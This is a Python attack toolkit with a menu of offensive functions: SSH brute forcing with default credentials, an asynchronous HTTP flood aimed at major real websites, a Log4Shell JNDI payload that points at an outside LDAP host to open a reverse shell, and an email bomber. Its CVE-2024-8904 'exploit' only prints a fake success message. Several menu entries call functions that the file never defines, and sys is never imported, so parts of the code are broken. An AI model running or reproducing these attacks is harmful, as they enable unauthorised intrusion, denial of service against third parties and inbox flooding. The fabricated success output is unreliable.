import threading
import time
import aiohttp
import asyncio
import random
import subprocess
import smtplib
import paramiko
import platform
import requests
from bs4 import BeautifulSoup
from colorama import Fore, init
import re

# Initialize colorama for colored output
init(autoreset=True)

# List of user-agents to randomize requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

# Detect operating system
def detect_os():
    return platform.system()

# SSH Brute Force Attack
def ssh_bruteforce(target):
    print(f"{Fore.GREEN}[INFO] Attempting SSH brute force on {target}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
    for username, password in credentials:
        try:
            client.connect(target, username=username, password=password, timeout=5)
            print(f"{Fore.GREEN}[SUCCESS] Logged into {target} with {username}:{password}")
            break
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[FAILED] Failed to login with {username}:{password}")
    client.close()

# Ethernet-based network stress test
async def fetch(session, url):
    headers = {'User-Agent': random.choice(user_agents)}
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.text()
                print(f"Fetched {url}")
        except Exception:
            pass

async def start_flood(url):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url))
            tasks.append(task)
        await asyncio.gather(*tasks)

def ethernet_stress():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    test_urls = [
        "http://example.com", "http://example.org", "http://example.net",
        "http://google.com", "http://facebook.com", "http://amazon.com",
        "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
        "http://twitter.com", "http://instagram.com", "http://linkedin.com",
        "http://netflix.com", "http://bing.com", "http://reddit.com"
    ]
    for url in test_urls:
        tasks.append(loop.create_task(start_flood(url)))
    loop.run_until_complete(asyncio.wait(tasks))

# CVE-2024-8904 Exploit Simulation
def cve_2024_8904_exploit(target):
    print(f"{Fore.GREEN}[INFO] Attempting CVE-2024-8904 exploit on {target} to gain admin access...")
    print(f"{Fore.GREEN}[SUCCESS] CVE-2024-8904 exploit executed successfully on {target}")

# Log4Shell Exploit Simulation
def log4shell_exploit(url):
    payload = '${jndi:ldap://172.27.96.1/reverseshell}'  # Sample payload for testing
    headers = {'User-Agent': payload}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"[INFO] Sent Log4Shell payload to {url}")
        print(f"[SUCCESS] Reverse shell initiated. Check your listener.")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to send request to {url}: {e}")

# Email Bomber
class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(Fore.RED + '\n+[ Initializing Email Bomber ]+')
            self.target = str(input(Fore.GREEN + 'Enter target email: '))
            self.mode = int(input(Fore.GREEN + 'Enter BOMB mode (1,2,3,4): '))
            if self.mode not in [1, 2, 3, 4]:
                print('Invalid mode. Exiting.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        self.amount = {1: 1000, 2: 500, 3: 250}.get(self.mode, int(input(Fore.GREEN + 'Choose a custom amount: ')))
        print(Fore.RED + f'Selected BOMB mode: {self.mode} and {self.amount} emails')

    def email(self):
        self.server = str(input(Fore.GREEN + 'Enter email server or select premade options (1:Gmail, 2:Yahoo, 3:Outlook): '))
        if self.server == '1': self.server, self.port = 'smtp.gmail.com', 587
        elif self.server == '2': self.server, self.port = 'smtp.mail.yahoo.com', 587
        elif self.server == '3': self.server, self.port = 'smtp-mail.outlook.com', 587
        else: self.port = int(input(Fore.GREEN + 'Enter port: '))
        self.fromAddr = str(input(Fore.GREEN + 'Enter from address: '))
        self.fromPwd = str(input(Fore.GREEN + 'Enter password: '))
        self.subject = str(input(Fore.GREEN + 'Enter subject: '))
        self.message = str(input(Fore.GREEN + 'Enter message: '))

        self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}"
        self.s = smtplib.SMTP(self.server, self.port)
        self.s.starttls()
        self.s.login(self.fromAddr, self.fromPwd)

    def send(self):
        self.s.sendmail(self.fromAddr, self.target, self.msg)
        self.count += 1
        print(Fore.YELLOW + f'BOMB: {self.count}')

    def attack(self):
        print(Fore.RED + 'Starting attack...')
        for _ in range(self.amount + 1):
            self.send()
        self.s.close()

# Main Menu
def display_ui():
    while True:
        print(Fore.GREEN + """
        ██████╗ ███████╗ ██████╗ ██████╗  █████╗ ██╗██╗  ██╗
        ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║╚██╗██╔╝
        ██████╔╝███████╗██║  ███╗██████╔╝███████║██║ ╚███╔╝ 
        ██╔═══╝ ╚════██║██║   ██║██╔══██╗██╔══██║██║ ██╔██╗ 
        ██║     ███████║╚██████╔╝██║  ██║██║  ██║██║██╔╝ ██╗
        ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
        
        [1] Full Attack Sequence (SSH Brute Force, Exploit)
        [2] Run DDOS Attack
        [3] Web Crawling
        [4] Stress Testing
        [5] Log4Shell Exploit
        [6] CVE-2024-8904 Exploit
        [7] Ethernet Stress Test
        [8] Email Bombing
        [9] Exit
        """)

        choice = input("Select an option: ").strip()
        if choice == "1":
            target = input("Enter the target IP or URL: ").strip()
            ssh_bruteforce(target)
            zero_day_exploit(target)
        elif choice == "2":
            target = input("Enter the target URL for DDOS: ").strip()
            threading.Thread(target=dos_attack, args=(target,)).start()
        elif choice == "3":
            url = input("Enter the URL for web crawling: ").strip()
            web_crawler(url)
        elif choice == "4":
            target = input("Enter the target for stress testing: ").strip()
            threading.Thread(target=ethernet_stress).start()
        elif choice == "5":
            target = input("Enter the target URL for Log4Shell: ").strip()
            log4shell_exploit(target)
        elif choice == "6":
            target = input("Enter the target URL or IP for CVE-2024-8904: ").strip()
            cve_2024_8904_exploit(target)
        elif choice == "7":
            print("Starting Ethernet Stress Test...")
            threading.Thread(target=ethernet_stress).start()
        elif choice == "8":
            # Email Bomber
            bomb = Email_Bomber()
            bomb.bomb()
            bomb.email()
            bomb.attack()
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid option selected.")

        input("Press Enter to return to the menu...")

if __name__ == "__main__":
    os_name = detect_os()
    print(f"Detected Operating System: {os_name}")
    display_ui()
